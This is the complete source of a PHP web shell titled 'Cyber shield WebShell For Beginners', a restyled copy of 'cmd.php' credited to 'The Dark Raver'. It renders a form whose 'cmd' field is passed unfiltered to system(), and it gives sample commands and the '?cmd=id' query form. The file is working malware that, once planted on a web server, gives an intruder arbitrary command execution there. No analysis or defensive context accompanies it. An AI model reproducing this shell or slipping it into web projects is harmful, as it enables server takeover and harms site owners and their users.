<?
//
// PHP_KIT
//
// cmd.php = Command Execution
//
// by: The Dark Raver
// modified: 21/01/2004
//
?>
<HTML><BODY style="background-color: #85bda7;">
<h1 style="margin-left: 40pc;  color: #581251; ">Cyber shield WebShell For Beginners</h1>
<p style="margin-left: 50pc; margin-top:5pc; color: #581251; ">commands:- (id,whoami,ls -la) </p>
<p style="margin-left: 50pc;  color: #581251; ">*.php?cmd=id</p>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT style="margin-left: 50pc; margin-top:5pc; border-radius: 22ch;" TYPE="text" NAME="cmd" >
<INPUT style="border-radius: 22ch;" TYPE="submit" VALUE="Send">
</FORM>
<pre style="color: #581612; margin-left: 50pc;">
<?php
if($_GET['cmd']) {
  system($_GET['cmd']);
  }
?>
</pre>
</BODY></HTML>
